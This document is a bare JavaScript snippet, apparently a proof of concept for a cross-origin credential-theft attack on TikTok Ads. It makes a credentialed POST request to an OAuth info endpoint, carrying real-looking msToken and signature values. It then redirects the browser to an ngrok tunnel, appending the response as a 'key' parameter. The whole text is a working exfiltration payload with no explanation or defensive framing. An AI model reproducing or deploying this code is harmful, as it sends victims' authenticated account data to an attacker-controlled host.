var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://ads.tiktok.com/ac/api/v1/oauth/tt_oauth_base_info?msToken=8OLXQsITlBMGlv_JTV-1nOiVJUQ-I-2RB3uVh9YzJWSDTWWkQRK2tUgF4kn5IoBdg8rf5NYNNiJquWQonJQYOmR4Aa4nbaOjC5ZWzcaraobpiToTKSNRYW2bqbXY6TDHlfc=&X-Bogus=DFSzsIVOKokANHbAtxrWi0WdbTLk&_signature=_02B4Z6wo00001Xdm9DgAAIDBXR8MrXfTMgV3Z.CAADk177");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
